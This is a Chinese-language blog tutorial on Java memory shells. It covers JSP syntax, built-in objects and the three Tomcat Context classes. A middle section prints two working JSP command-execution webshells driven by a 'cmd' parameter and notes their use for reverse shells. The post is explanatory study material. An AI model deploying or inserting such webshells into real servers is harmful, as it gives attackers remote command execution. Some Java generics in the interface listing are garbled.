---
title: 内存马和JSP基础知识
date: 2026-06-12 08:05:28
updated: 2026-06-25 02:24:17
tags:
  - Web
  - 内存马
  - Tomcat内存马
---
-   参考: [Java内存马系列-02-内存马介绍 | Drunkbaby’s Blog](https://drun1baby.top/2022/08/21/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-02-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/)

---

## 0x01 内存马简史

由于现在各种防护措施越来越多，文件shell就如c0ny1师傅所说的大部分已经气数已尽，内存马因其隐蔽性等优点从而越来越盛行。

其实内存马由来已久，早在17年n1nty师傅的[《Tomcat源码调试笔记-看不见的shell》](https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw)中已初见端倪，但一直不温不火。后经过rebeyong师傅使用[agent技术](https://www.cnblogs.com/rebeyond/p/9686213.html)加持后，拓展了内存马的使用场景，然终停留在奇技淫巧上。在各类hw洗礼之后，文件shell明显气数已尽。内存马以救命稻草的身份重回大众视野。特别是今年在shiro的回显研究之后，引发了无数安全研究员对内存webshell的研究，其中涌现出了LandGrey师傅构造的[Spring controller内存马](https://landgrey.me/blog/12/)。至此内存马开枝散叶发展出了三大类型：

1.  servlet-api类

-   filter型

-   servlet型

2.  spring类

-   拦截器

-   controller型

3.  Java Instrumentation类

-   agent型

> 在讲内存马之前，我们还是看一看 jsp 基础。

## 0x02 JSP 基础

-   首先是 JSP 环境的搭建，我们要起一个 JSP 的环境，有的教程说起 SpringMVC 的，其实完全没必要，简单的 JSP 即可。

### 1\. 什么是JSP

JSP（Java Server Pages），是Java的一种动态网页技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须得手动`println`一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术。

JSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。

当第一次访问JSP页面时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。

### 2\. JSP 环境的搭建

可以直接看我这篇文章，其他文章感觉说的有点玄乎了，其实 IDEA 里面内置了 JSP 的项目框架，可以直接搭建的。

[Servlet 项目搭建](https://drun1baby.github.io/2022/08/22/Servlet-%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA/)

### 3\. JSP的语法

#### 脚本程序

脚本程序可以包含任意量的Java语句、变量、方法或表达式，只要它们在脚本语言中是有效的。脚本程序的格式如下

```java
<% 代码片段 %>
```

下面是使用示例

```java
<html>
<body>
<h2>Hello World!!!</h2>

<% out.println("GoodBye!"); %>
</body>

</html>

```

#### JSP声明

一个声明语句可以声明一个或多个变量、方法，供后面的 Java 代码使用。JSP 声明语句格式如下

```java
<%! 声明  %>
```

同样等价于下面的XML语句

```xml
<jsp:declaration>
代码片段
</jsp:declaration>

```

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251526932-889bb7c0-7ae7-4a72-92be-693a992c3100.png)

下面是使用示例

```java
<html>
<body>
<h2>Hello World!!!</h2>

<%! String s= "GoodBye!"; %>
<% out.println(s); %>
</body>

</html>

```

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251527041-22e2574f-0e3f-48a9-86b8-3f64eaa0a263.png)

其实在脚本里面也是可以直接进行声明的

```java
<%
    int i = 3;
%>
```

#### JSP 表达式

```java
<%= 表达式 %>
```

等价于下面的XML表达式

```xml
<jsp:expression>   表达式</jsp:expression>

```

下面是使用示例

```java
<html>
<body>
<h2>Hello World!!!</h2>

<p><% String name = "Drunkbaby"; %>username:<%=name%></p>

</body>

</html>

```

输出如图

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251527115-8ca73648-90b6-42bc-9ecc-f4c8aabccc50.png)

#### JSP 指令

JSP指令用来设置与整个JSP页面相关的属性。下面有三种JSP指令

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251527179-6410c2c7-f1df-4959-921f-3a3d556363d3.png)

比如我们能通过page指令来设置jsp页面的编码格式

```java
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
```

回显是一样的，因为 JSP 属于模板引擎

#### JSP 注释

格式如下

```java
<%-- 注释内容 --%>
```

### 4\. JSP内置对象

JSP有九大内置对象，他们能够在客户端和服务器端交互的过程中分别完成不同的功能。其特点如下

-   由 JSP 规范提供，不用编写者实例化

-   通过 Web 容器实现和管理

-   所有 JSP 页面均可使用

-   只有在脚本元素的表达式或代码段中才能使用

| 对 象 | 类型 | 说 明 |
| --- | --- | --- |
| [request](https://drun1baby.top/jsp2/request.html) | javax.servlet.http.HttpServletRequest | 获取用户请求信息 |
| [response](https://drun1baby.top/jsp2/response.html) | javax.servlet.http.HttpServletResponse | 响应客户端请求，并将处理信息返回到客户端 |
| [out](https://drun1baby.top/jsp2/out.html) | javax.servlet.jsp.JspWriter | 输出内容到 HTML 中 |
| [session](https://drun1baby.top/jsp2/session.html) | javax.servlet.http.HttpSession | 用来保存用户信息 |
| [application](https://drun1baby.top/jsp2/application.html) | javax.servlet.ServletContext | 所有用户共享信息 |
| [config](https://drun1baby.top/jsp2/config.html) | javax.servlet.ServletConfig | 这是一个 Servlet 配置对象，用于 Servlet 和页面的初始化参数 |
| [pageContext](https://drun1baby.top/jsp2/pagecontext.html) | javax.servlet.jsp.PageContext | JSP 的页面容器，用于访问 page、request、application 和 session 的属性 |
| [page](https://drun1baby.top/jsp2/page_object.html) | javax.servlet.jsp.HttpJspPage | 类似于 Java 类的 this 关键字，表示当前 JSP 页面 |
| [exception](https://drun1baby.top/jsp2/page.html) | java.lang.Throwable | 该对象用于处理 JSP 文件执行时发生的错误和异常；只有在 JSP 页面的 page 指令中指定 isErrorPage 的取值 true 时，才可以在本页面使用 exception 对象。 |

## 0x03 传统内存马

-   讲完了 Tomcat 架构的理解和 JSP 的一些基础，我们可以正式开始学习内存马了

我们先来看一看传统的 JSP 内存马是什么样子的。

```java
<%

    Runtime.getRuntime().exec(request.getParameter("cmd"));

%>
```

上面是最简单的一句话木马，没有回显，适合用来反弹shell。我们这里弹个计算器看一看。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251527258-1dffd688-46b3-4598-9374-6df0f755c421.png)

下面是一个带回显的JSP木马

```java
<% if(request.getParameter("cmd")!=null){
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1){
        out.print(new String(b));
    }
    out.print("</pre>");
}

%>
```

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251527342-2a987ea9-9043-495b-8d1b-3d542f09cb50.png)

传统的JSP木马特征性强，且需要文件落地，容易被查杀。因此现在出现了内存马技术。Java内存马又称”无文件马”，相较于传统的JSP木马，其最大的特点就是无文件落地，存在于内存之中，隐蔽性强。

-   利用Java Web组件：动态添加恶意组件，如Servlet、Filter、Listener等。在Spring框架下就是Controller、Intercepter。

-   修改字节码：利用Java的Instrument机制，动态注入Agent，在Java内存中动态修改字节码，在HTTP请求执行路径中的类中添加恶意代码，可以实现根据请求的参数执行任意代码。

## 0x04 Tomcat 中的三个 Context 的理解

### Context

context是上下文的意思，在java中经常能看到这个东西。那么到底是什么意思呢？

根据yzddmr6师傅的理解，如果把某次请求比作电影中的事件，那么context就相当于事件发生的背景。例如一部电影中的某个镜头中，张三大喊“奥利给”，但是只看这一个镜头我们不知道到底发生了什么，张三是谁，为什么要喊“奥利给”。所以就需要交代当时事情发生的背景。张三是吃饭前喊的奥利给？还是吃饭后喊的奥利给？因为对于同一件事情：张三喊奥利给这件事，发生的背景不同意义可能是不同的。吃饭前喊奥利给可能是饿了的意思，吃饭后喊奥利给可能是说吃饱了的意思。

在WEB请求中也如此，在一次request请求发生时，背景，也就是context会记录当时的情形：当前WEB容器中有几个filter，有什么servlet，有什么listener，请求的参数，请求的路径，有没有什么全局的参数等等。

### ServletContext

ServletContext是Servlet规范中规定的ServletContext接口，一般servlet都要实现这个接口。

大概就是规定了如果要实现一个WEB容器，他的Context里面要有这些东西：获取路径，获取参数，获取当前的filter，获取当前的servlet等

```java
package javax.servlet;

import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Enumeration;
import java.util.EventListener;
import java.util.Map;
import java.util.Set;
import javax.servlet.ServletRegistration.Dynamic;
import javax.servlet.descriptor.JspConfigDescriptor;

public interface ServletContext {
    String TEMPDIR = "javax.servlet.context.tempdir";

    String getContextPath();
    ServletContext getContext(String var1);
    int getMajorVersion();
    int getMinorVersion();
    int getEffectiveMajorVersion();
    int getEffectiveMinorVersion();
    String getMimeType(String var1);
    Set getResourcePaths(String var1);
    URL getResource(String var1) throws MalformedURLException;
    InputStream getResourceAsStream(String var1);
    RequestDispatcher getRequestDispatcher(String var1);
    RequestDispatcher getNamedDispatcher(String var1);
    /** @deprecated */
    Servlet getServlet(String var1) throws ServletException;
    /** @deprecated */
    Enumeration getServlets();
    /** @deprecated */
    Enumeration getServletNames();
    void log(String var1);
    /** @deprecated */
    void log(Exception var1, String var2);
    void log(String var1, Throwable var2);
    String getRealPath(String var1);
    String getServerInfo();
    String getInitParameter(String var1);
    Enumeration getInitParameterNames();
    boolean setInitParameter(String var1, String var2);
    Object getAttribute(String var1);
    Enumeration getAttributeNames();

    void setAttribute(String var1, Object var2);

    void removeAttribute(String var1);

    String getServletContextName();

    Dynamic addServlet(String var1, String var2);

    Dynamic addServlet(String var1, Servlet var2);

    Dynamic addServlet(String var1, Class var2);

     extends Servlet> T createServlet(Classvar1) throws ServletException;

    ServletRegistration getServletRegistration(String var1);

    Map ? extends ServletRegistration> getServletRegistrations();

    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, String var2);

    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Filter var2);

    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Class var2);

     extends Filter> T createFilter(Classvar1) throws ServletException;
    FilterRegistration getFilterRegistration(String var1);
    Map ? extends FilterRegistration> getFilterRegistrations();
    SessionCookieConfig getSessionCookieConfig();
    void setSessionTrackingModes(Setvar1);

    Set getDefaultSessionTrackingModes();

    Set getEffectiveSessionTrackingModes();

    void addListener(String var1);
     extends EventListener> void addListener(T var1);

    void addListener(Class var1);
     extends EventListener> T createListener(Classvar1) throws ServletException;
    JspConfigDescriptor getJspConfigDescriptor();
    ClassLoader getClassLoader();
    void declareRoles(String... var1);
}
```

可以看到ServletContext接口中定义了很多操作，能对Servlet中的各种资源进行访问、添加、删除等。

### ApplicationContext

在Tomcat中，ServletContext规范的实现是ApplicationContext，因为门面模式的原因，实际套了一层ApplicationContextFacade。关于什么是门面模式具体可以看[这篇文章](https://www.runoob.com/w3cnote/facade-pattern-3.html)，简单来讲就是加一层包装。也可以理解为 AOP 吧

其中ApplicationContext实现了ServletContext规范定义的一些方法，例如addServlet,addFilter等

### StandardContext

`org.apache.catalina.core.StandardContext`是子容器`Context`的标准实现类，其中包含了对Context子容器中资源的各种操作。四种子容器都有其对应的标准实现如下

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251527408-c234432c-299e-4487-a39c-ecf6278065a4.png)

而在ApplicationContext类中，对资源的各种操作实际上是调用了StandardContext中的方法

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251527483-17493916-b498-4cd8-a1dd-edd5ff940059.png)

```java
...
@Override
    public String getRequestCharacterEncoding() {
        return context.getRequestCharacterEncoding();
    }
...
```

### Tomcat 三个 Context 总结

我们可以用一张图来表示各Context的关系

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1781251527584-20bd0044-fb7f-40fe-a0fe-75e7dddb8217.png)

ServletContext接口的实现类为ApplicationContext类和ApplicationContextFacade类，其中ApplicationContextFacade是对ApplicationContext类的包装。我们对Context容器中各种资源进行操作时，最终调用的还是StandardContext中的方法，因此StandardContext是Tomcat中负责与底层交互的Context。

## 0x05 小结

-   简单看了看 JSP 与 Tomcat 中三个 Context 的一些东西，感觉还好。